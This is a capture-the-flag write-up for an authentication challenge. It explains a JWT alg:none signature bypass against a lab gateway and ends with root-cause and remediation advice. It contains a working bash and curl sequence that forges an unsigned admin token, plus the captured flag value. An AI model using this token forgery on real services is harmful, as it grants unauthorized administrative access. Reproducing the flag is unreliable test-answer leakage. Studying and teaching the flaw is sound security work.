# ConnectAPI_Partner_Gateway - JWT alg:none signature bypass

| | |
|---|---|
| **Challenge** | ConnectAPI_Partner_Gateway |
| **Category** | AUTH |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://auth7.chal.deti:8066 |
| **Auth weakness** | CWE-347 - improper verification of cryptographic signature (JWT `alg:none`) |
| **Creds given** | acme / acmepass |

## Hint
> The token picks its own lock to be checked with - say "none," walk right in.

## Recon
- Login form at `/login`, fields **`partner`** / **`secret`**. On success it
  returns a JWT to send as `Authorization: Bearer <token>`.
- Gated endpoint: **`GET /partner/admin`**.
- Issued token (`acme` / `acmepass`):
  - header `{"alg":"HS256","typ":"JWT"}`
  - payload `{"partner":"acme","iat":1794404873}`

## Approach
CWE-347: the gateway trusts the token's own `alg` header. Setting **`alg:none`**
tells it there is no signature to verify, so we can freely rewrite the claims.
Forge a token with `alg:none`, change `partner` → `admin`, and leave the
signature segment **empty** (header.payload. with a trailing dot).

## Exploitation - the exact requests
```bash
HEADER=$(printf '{"alg":"none","typ":"JWT"}'  | basenc --base64url | tr -d '=')
PAYLOAD=$(printf '{"partner":"admin"}'        | basenc --base64url | tr -d '=')
TOKEN="$HEADER.$PAYLOAD."                      # trailing dot = empty signature

curl -s -H "Authorization: Bearer $TOKEN" \
     http://auth7.chal.deti:8066/partner/admin | grep -o 'flag{[^}]*}'
```

## Flag
```
flag{394d43462cb3ca6914bd4991b0ee1757}
```

## Root cause & remediation
- **Cause:** the server honors the attacker-controlled `alg` header and accepts
  `alg:none`, performing no signature check (CWE-347) - any claims are trusted.
- **Fix:** never accept `alg:none`; pin the expected algorithm server-side
  (e.g. require HS256/RS256) and reject tokens whose header says otherwise;
  verify the signature with a secret/public key before reading claims; derive
  authorization from a trusted store, not solely from token claims.
